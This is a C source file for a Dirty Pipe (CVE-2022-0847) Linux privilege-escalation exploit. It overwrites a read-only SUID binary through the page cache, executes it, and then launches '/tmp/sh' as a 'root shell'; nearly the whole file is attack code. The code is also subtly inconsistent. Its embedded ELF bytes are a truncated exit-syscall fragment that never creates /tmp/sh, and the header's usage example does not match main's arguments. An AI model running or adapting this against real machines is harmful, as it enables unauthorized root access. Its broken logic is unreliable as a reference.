* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */



#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <stdint.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

unsigned char elfcode[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05 // exit syscall
};

static void prepare_pipe(int p[2]) {
    if (pipe(p)) exit(1);
    unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    char buffer[PAGE_SIZE];
    for (unsigned r = pipe_size; r > 0; r -= PAGE_SIZE)
        write(p[1], buffer, r > PAGE_SIZE ? PAGE_SIZE : r);
    for (unsigned r = pipe_size; r > 0; r -= PAGE_SIZE)
        read(p[0], buffer, r > PAGE_SIZE ? PAGE_SIZE : r);
}

int hax(char *filename, long offset, uint8_t *data, size_t len) {
    int fd = open(filename, O_RDONLY);
    if (fd < 0) return perror("open"), -1;

    struct stat st;
    if (fstat(fd, &st)) return perror("stat"), -1;

    int p[2];
    prepare_pipe(p);

    --offset;
    if (splice(fd, &offset, p[1], NULL, 1, 0) < 0) return perror("splice"), -1;

    if (write(p[1], data, len) < 0) return perror("write"), -1;

    close(fd);
    return 0;
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <SUID binary>\n", argv[0]);
        return 1;
    }

    char *path = argv[1];
    int fd = open(path, O_RDONLY);
    if (fd < 0) return perror("open"), 1;

    uint8_t *orig_bytes = malloc(sizeof(elfcode));
    lseek(fd, 1, SEEK_SET);
    read(fd, orig_bytes, sizeof(elfcode));
    close(fd);

    printf("[+] Hijacking SUID binary...\n");
    if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) return 1;

    printf("[+] Dropping SUID shell...\n");
    system(path);

    printf("[+] Restoring SUID binary...\n");
    if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) return 1;

    printf("[+] Popping root shell...\n");
    system("/tmp/sh");

    free(orig_bytes);
    return 0;
}
